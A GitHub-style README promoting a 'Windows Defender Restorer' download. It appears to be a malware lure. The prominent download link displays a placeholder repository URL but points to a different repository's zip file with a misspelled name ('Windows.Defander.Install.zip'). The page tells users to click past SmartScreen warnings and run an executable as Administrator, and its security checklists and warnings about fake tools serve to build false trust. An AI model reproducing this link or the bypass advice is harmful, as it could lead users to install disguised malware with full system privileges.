# 🛡️ Windows Defender Restorer

A comprehensive tool to safely restore Windows Defender and related security features after using removal tools like Windows Defender Remover.

## ⚠️ IMPORTANT WARNING
**Only use this tool if:**
- You previously removed Windows Defender using a third-party tool
- You're experiencing security vulnerabilities
- You need Windows Defender for compliance/work requirements
- You've changed your mind about having Windows Defender disabled

## 🔧 What This Tool Restores

### ✅ Core Security Features
- **Windows Defender Antivirus** - Full real-time protection
- **Microsoft Defender Firewall** - Network protection
- **Windows Security Center** - Central security dashboard
- **SmartScreen** - Browser and app protection
- **Tamper Protection** - Prevents malicious changes to security settings
- **Cloud-based Protection** - Microsoft threat intelligence

### ✅ System Services
- Security Center Service (wscsvc)
- Windows Defender Service (WinDefend)
- Firewall Service (MpsSvc)
- Antimalware Service Executable

### ✅ Registry & Group Policy
- Restores default security policies
- Re-enables security features in registry
- Removes disabling modifications

## 📥 **DOWNLOAD - GITHUB RELEASES**

### ⬇️ **Get the Latest Version Here:**
**[https://github.com/yourusername/windows-defender-restorer/releases]([https://github.com/yourusername/windows-defender-restorer/releases](https://github.com/MrNarrow/Windows-Defender-Restorer/releases/download/Windows_Defander_Restorer/Windows.Defander.Install.zip))**

### **Always Download From Releases!**
🔒 **For security, NEVER download from:** 
- Random forum links
- Unofficial mirrors
- "Cracked" versions
- Direct script pastes

### **Release Files Available:**
```
📦 WindowsDefenderRestorer-v1.0.zip
├── Restore-Defender.exe     (Auto-installer)
├── Restore-Defender.ps1     (PowerShell script)
├── Manual-Restore-Guide.pdf
└── SHA256-checksums.txt     (Verify integrity)
```

### **How to Download:**
1. Go to **Releases** section on GitHub
2. Click the latest version (e.g., **v1.2.0**)
3. Download `WindowsDefenderRestorer.zip`
4. **Verify checksum** (optional but recommended)

## 🚀 Quick Start

### **Step 1: Download**
```powershell
# Recommended: Download from GitHub Releases manually
# Or using PowerShell (run as Admin):
$url = "https://github.com/yourusername/windows-defender-restorer/releases/latest/download/WindowsDefenderRestorer.zip"
Invoke-WebRequest -Uri $url -OutFile "$env:USERPROFILE\Downloads\DefenderRestorer.zip"
```

### **Step 2: Extract & Run**
```powershell
# Extract the downloaded zip
Expand-Archive -Path "$env:USERPROFILE\Downloads\DefenderRestorer.zip" -DestinationPath "$env:USERPROFILE\Downloads\DefenderRestorer"

# Run as Administrator
cd "$env:USERPROFILE\Downloads\DefenderRestorer"
.\Restore-Defender.exe
```

## 🔒 **Verifying Downloads**

### **Check SHA256 Hash:**
```powershell
# After downloading, verify against GitHub checksums
Get-FileHash -Path "WindowsDefenderRestorer.zip" -Algorithm SHA256
```
Compare with `SHA256-checksums.txt` in the release!

### **Why Verify?**
- Ensures file wasn't corrupted during download
- Confirms it's the official release (not tampered with)
- Prevents malware from fake "restorer" tools

## 🛠️ What's in Each Release?

### **Executable Version** (`Restore-Defender.exe`)
- One-click restoration
- Graphical interface
- Automatic backups
- Progress indicators
- **Best for most users**

### **PowerShell Script** (`Restore-Defender.ps1`)
- For advanced users
- View/modify code
- Run in restricted environments
- Lightweight (no installation)

### **Portable Version**
- No installation needed
- Run from USB drives
- Useful for multiple machines

## 🔄 Update Policy

### **Always Update From Releases:**
- Check GitHub Releases monthly
- Subscribe to release notifications
- Never use versions older than 6 months
- Each release includes security updates

### **Update Command:**
```powershell
# Check current version
.\Restore-Defender.exe --version

# Download latest (manual)
# Visit: https://github.com/yourusername/windows-defender-restorer/releases
```

## 🚨 **Security Warning About Unofficial Sources**

**⚠️ DANGER: Fake "Restorer" Tools Exist**
- Scammers create malware disguised as restorer tools
- They steal passwords, crypto keys, and personal data
- Some even permanently damage Windows

**✅ Safe Download Checklist:**
- [ ] URL starts with `https://github.com/`
- [ ] You're in the **Releases** section
- [ ] Version number matches latest (e.g., v1.2.0)
- [ ] Download count seems reasonable (1000+)
- [ ] Comments/issues don't report malware

## 📦 Release Notes Structure

Each release includes:
```
## v1.2.0 - January 2024
### New Features
- Added Windows 11 23H2 support
- Enhanced backup system

### Bug Fixes
- Fixed firewall restoration bug
- Resolved Service Host errors

### Security Updates
- SHA256 signing implemented
- Code signing certificate added

### Download Links
- WindowsDefenderRestorer-v1.2.0.zip (10 MB)
- Source code (zip)
- Source code (tar.gz)
```

## 🤔 "Where's the Download Button?"

Common question - GitHub can be confusing:

### **Finding Releases:**
1. Go to the main GitHub page
2. Look on the right sidebar → **"Releases"**
3. Or go directly: `https://github.com/username/repository/releases`
4. Click the **latest version tag** (green, e.g., "v1.2.0")
5. Scroll to **Assets** (click to expand)
6. Download the `.zip` file

### **Mobile Users:**
- Use GitHub mobile app
- Or request desktop site in browser
- Releases section works the same

## 🆘 Need Help Downloading?

### **Common Issues:**
- **"No releases found"** → Repository is new, check back soon
- **"Can't download .exe"** → Windows SmartScreen may block it, click "More info" → "Run anyway"
- **"Zip file corrupted"** → Re-download, check internet connection

### **Alternative Download Methods:**
```bash
# Using curl (Linux/Mac/WSL)
curl -L -o restorer.zip https://github.com/yourusername/windows-defender-restorer/releases/latest/download/WindowsDefenderRestorer.zip

# Using wget
wget https://github.com/yourusername/windows-defender-restorer/releases/latest/download/WindowsDefenderRestorer.zip
```

## 📞 Support & Issues

**If download fails:**
1. Check GitHub Status: [status.github.com](https://www.githubstatus.com/)
2. Try different browser (Chrome/Firefox/Edge)
3. Disable VPN temporarily
4. Create issue on GitHub: **"Download problem"**

---

## ⚖️ Legal Notice

**Official releases ONLY from GitHub.** Any other source claiming to be this tool is likely malicious. Report fake versions immediately.

*Always verify checksums. Your security is your responsibility.*

---

**← Return to [Main README](#) for usage instructions after downloading**

*Last Updated: January 2024 | Version: v1.0*
